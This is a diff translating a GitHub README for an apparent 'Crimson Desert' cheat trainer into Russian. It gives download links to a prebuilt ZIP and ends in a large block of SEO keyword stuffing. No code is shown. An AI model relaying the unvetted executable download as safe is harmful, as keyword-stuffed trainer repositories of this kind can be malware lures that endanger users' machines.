@@ -1,9 +1,9 @@
-# Crimson Desert Trainer +12 (2026)
+# Трейнер Crimson Desert +12 (2026)
 ### Infinite HP · Stamina · Spirit · One Hit · Money · Speed
 
 **Languages / Языки:** [English](README.md) · [Русский](README.ru.md) · [Українська](README.uk.md) · [简体中文](README.zh.md) · [Türkçe](README.tr.md) · [Español](README.es.md) · [Slovenščina](README.sl.md) · [Português](README.pt.md) · [Polski](README.pl.md) · [Indonesia](README.id.md) · [Deutsch](README.de.md) · [Français](README.fr.md)
 
-**Download Crimson Desert Trainer** — +12 (2026).
+**Скачать трейнер Crimson Desert** — +12 (2026).
 Infinite HP / Stamina / Spirit · One Hit · Money · Game Speed · Freeze Time.
 `CrimsonDesert.exe` · Windows 10/11
 
@@ -32,7 +32,7 @@ Infinite HP / Stamina / Spirit · One Hit · Money · Game Speed · Freeze Time.
 
 ---
 
-## Download Crimson Desert Trainer
+## Скачать трейнер Crimson Desert
 
 > Direct ZIP / Прямая ссылка:
 
@@ -117,20 +117,20 @@ Game → trainer → `CrimsonDesert.exe` → enable cheats.
 
 ## FAQ
 
-**Where to download?**  
+**Где скачать?**  
 [ZIP v1.0.0](https://github.com/TrainerHubMoggyDay/Crimson-Desert-Trainer-InfiniteHP-Stamina-OneHit-Money-Speed/releases/download/v1.0.0/Crimson.Desert.Trainer.Le.zip) · [VGtimes](https://vgtimes.ru/games/crimson-desert/files/96369-crimson-desert-trejjner-12-2026.html)
 
-**Infinite HP / One Hit / money / speed?**  
+**Есть Infinite HP / One Hit / деньги / скорость?**  
 Yes — see features and video.
 
-**How many cheats?**  
-**+12** across Player, Combat, World, Items.
+**Сколько читов?**  
+**+12** — Player, Combat, World, Items.
 
 ---
 
-## Disclaimer
+## Дисклеймер
 
-For single-player use only. Author and [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay) are not responsible. Do not use online / multiplayer.
+Только для одиночной игры. Автор и [TrainerHub MoggyDay](https://github.com/TrainerHubMoggyDay) не несут ответственности. Не используйте в онлайне.
 
 ---
 
@@ -147,4 +147,4 @@ For single-player use only. Author and [TrainerHub MoggyDay](https://github.com/
 
 ## SEO / Keywords
 
-`download Crimson Desert trainer` · `Crimson Desert trainer download` · `Crimson Desert cheats` · `Crimson Desert hack` · `Crimson Desert mods` · `Crimson Desert god mode` · `Crimson Desert infinite health` · `Crimson Desert infinite HP` · `Crimson Desert infinite stamina` · `Crimson Desert infinite spirit` · `Crimson Desert one hit kill` · `Crimson Desert super damage` · `Crimson Desert money hack` · `Crimson Desert infinite money` · `Crimson Desert game speed` · `Crimson Desert freeze time` · `Crimson Desert daytime freeze` · `Crimson Desert trainer free` · `Crimson Desert trainer 2026` · `Crimson Desert trainer windows` · `CrimsonDesert.exe trainer` · `Crimson Desert +12 trainer` · `action adventure trainer` · `pearl abyss trainer` · `single player trainer` · `pc trainer Crimson Desert` · `TrainerHub MoggyDay`
+`скачать трейнер Crimson Desert` · `Crimson Desert трейнер скачать` · `Crimson Desert читы` · `Crimson Desert взлом` · `Crimson Desert моды` · `Crimson Desert режим бога` · `Crimson Desert бесконечное HP` · `Crimson Desert бесконечная стамина` · `Crimson Desert бесконечный spirit` · `Crimson Desert ваншот` · `Crimson Desert деньги` · `Crimson Desert скорость игры` · `Crimson Desert заморозка времени` · `трейнер Crimson Desert бесплатно` · `Crimson Desert трейнер 2026` · `CrimsonDesert.exe трейнер` · `TrainerHub MoggyDay` · `download Crimson Desert trainer` · `Crimson Desert trainer download` · `Crimson Desert cheats` · `Crimson Desert hack` · `Crimson Desert mods` · `Crimson Desert god mode` · `Crimson Desert infinite health` · `Crimson Desert infinite HP` · `Crimson Desert infinite stamina` · `Crimson Desert infinite spirit` · `Crimson Desert one hit kill` · `Crimson Desert super damage` · `Crimson Desert money hack` · `Crimson Desert infinite money` · `Crimson Desert game speed` · `Crimson Desert freeze time` · `Crimson Desert daytime freeze` · `Crimson Desert trainer free` · `Crimson Desert trainer 2026` · `Crimson Desert trainer windows` · `CrimsonDesert.exe trainer` · `Crimson Desert +12 trainer` · `action adventure trainer` · `pearl abyss trainer` · `single player trainer` · `pc trainer Crimson Desert` · `TrainerHub MoggyDay`
